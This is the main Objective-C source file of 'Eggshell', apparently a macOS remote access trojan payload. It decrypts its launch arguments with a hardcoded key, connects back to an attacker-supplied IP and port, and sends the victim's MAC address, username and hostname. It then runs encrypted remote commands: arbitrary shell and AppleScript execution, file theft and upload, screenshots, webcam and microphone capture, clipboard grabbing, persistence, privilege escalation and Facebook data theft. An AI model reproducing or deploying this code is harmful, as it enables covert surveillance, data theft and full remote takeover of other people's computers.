//
//  main.m
//  Eggshell OSX Payload
//
//  Created by Lucas Jackson on 8/23/16.
//  Copyright © 2016 Lucas Jackson. All rights reserved.
//
#import <Foundation/Foundation.h>
#import <sys/socket.h>
#import "AppKit/AppKit.h"
#import "eshelper.h"
#import "espl.h"
NSString *bkey = @"spGHbigdxMBJpbOCAr3rnS3inCdYQyZV";
espl *_espl;
//MARK: Main
//log with this
//system([[NSString stringWithFormat:@"echo '%@' >> /tmp/esplog",@"1"] UTF8String]);

int main(int argc, const char * argv[]) {
    _espl = [[espl alloc] init];
    if (argc == 1) { return 0; }
    
    //decrypt argument with shared key
    NSString *argument = [NSString stringWithFormat:@"%s",argv[1]];
    argument = [escryptor decryptB64ToNSString:bkey :argument];
    
    //argument to json
    NSError *initError = nil;
    NSDictionary *initDictionary = [eshelper stringToJSON:argument :initError];
    if (initError != nil) {
        return 0;
    }
    //init params
    NSString *ip = [initDictionary objectForKey:@"ip"];
    int port = [[initDictionary objectForKey:@"port"] intValue];
    _espl.skey = [initDictionary objectForKey:@"key"];
    _espl.terminator = [initDictionary objectForKey:@"term"];
    debug = [[initDictionary objectForKey:@"debug"] boolValue];
    //connect
    int success = [_espl connect:ip :port];
    if (success == -1) {
        if (debug) [_espl debugLog:[NSString stringWithFormat:@"%@ %d %@ %@",ip,port,_espl.skey,_espl.terminator]] ;
    }
    else {
        //send mac address, username@host info to server
        NSString *systeminfo = [NSString stringWithFormat:@"%@ %@@%@",[_espl GetMACAddressDisplayString],NSUserName(),[[NSHost currentHost] localizedName]];
        [_espl sendString:systeminfo];
        
        //shell
        NSString *command = @"";
        char buffer[2048];
        while (read (sockfd, &buffer, sizeof(buffer))) {
            @autoreleasepool {
                //decrypt received data
                command = [escryptor decryptB64ToNSString:_espl.skey : [NSString stringWithFormat:@"%s",buffer]];
                //json decode decrypted received data
                NSError *decodeError = nil;
                NSDictionary *receivedDictionary = [eshelper stringToJSON:command :decodeError];
                //if there was an error with our input, a message is helpful
                if (decodeError != nil) {
                    if (debug) [_espl debugLog:command];
                    [_espl sendString:[NSString stringWithFormat:@"%@",decodeError]];
                }
                //assign
                NSString *cmd = [receivedDictionary objectForKey:@"cmd"];
                NSString *cmdArgument = [receivedDictionary objectForKey:@"args"];
                NSString *cmdType = [receivedDictionary objectForKey:@"type"];
                _espl.terminator = [receivedDictionary objectForKey:@"term"];
                
                if (debug) [_espl debugLog:command];
                
                //APPLESCRIPTS
                if ([cmdType isEqualToString:@"applescript"]) {
                    [_espl runAppleScript:cmd :cmdArgument];
                }
                //UPLOADS + DOWNLOADS
                else if ([cmdType isEqualToString:@"upload"]) {
                    if ([cmd isEqualToString: @"upload"]) {
                        [_espl receiveFileData:cmdArgument :[[receivedDictionary objectForKey:@"filesize"] longValue]];
                    }
                }
                else if ([cmdType isEqualToString:@"download"]) {
                    //TODO: Add better error handling
                    NSData *rawdata = nil;
                    if ([cmd isEqualToString: @"picture"]) {
                        rawdata = [_espl takePicture];
                    }
                    else if ([cmd isEqualToString: @"download"]) {
                        rawdata = [_espl filePathToData:cmdArgument];
                    }
                    else if ([cmd isEqualToString: @"screenshot"]) {
                        rawdata = [_espl screenshot];
                    }
                    else {
                        [_espl sendString:[NSString stringWithFormat:@"unable to perform %@",cmd]];
                    }
                    if (rawdata != nil) {
                        [_espl sendFileData:rawdata];
                    }
                }
                else if ([cmdType isEqualToString: @"eggsu"]) {
                    [_espl debugLog:@"type is eggsu"];
                    [_espl su:cmdArgument:ip:port];
                }
                else if ([cmd isEqualToString: @"exit"]) {
                    exit(0);
                }
                else if ([cmd isEqualToString: @"pid"]) {
                    [_espl getPid];
                }
                else if ([cmd isEqualToString: @"getpaste"]) {
                    [_espl getPaste];
                }
                else if ([cmd isEqualToString: @"idletime"]) {
                    [_espl idleTime];
                }
                else if ([cmd isEqualToString: @"brightness"]) {
                    [_espl set_brightness:cmdArgument];
                }
                else if ([cmd isEqualToString: @"cd"]) {
                    [_espl changeWD:cmdArgument];
                }
                else if ([cmd isEqualToString: @"pwd"]) {
                    [_espl sendString:_espl.fileManager.currentDirectoryPath];
                }
                else if ([cmd isEqualToString: @"mic"]) {
                    [_espl mic:cmdArgument];
                }
                else if ([cmd isEqualToString: @"openurl"]) {
                    [_espl openURL:cmdArgument];
                }
                else if ([cmd isEqualToString: @"persistence"]) {
                    [_espl persistence:ip :port];
                }
                else if ([cmd isEqualToString: @"rmpersistence"]) {
                    [_espl removePersistence:ip :port];
                }
                else if ([cmd isEqualToString: @"getfacebook"]) {
                    [_espl getFacebook];
                }
                else {
                    if ([cmd isEqualToString:@"endtask"]) {
                        [_espl runtask:cmd];
                    }
                    else {
                        [_espl runtask:[NSString stringWithFormat:@"%@ %@",cmd,cmdArgument]];
                    }
                }
                //clear the received data
                memset(buffer,'\0',2048);
            }
        }
    }
    
    return 0;
}



/* depricated
 else if ([cmd isEqualToString: @"ls"]) {
    [_espl directoryList:cmdArgument];
 }
 else if ([cmd isEqualToString: @"rm"]) {
    [_espl rmFile:cmdArgument];
 }
*/
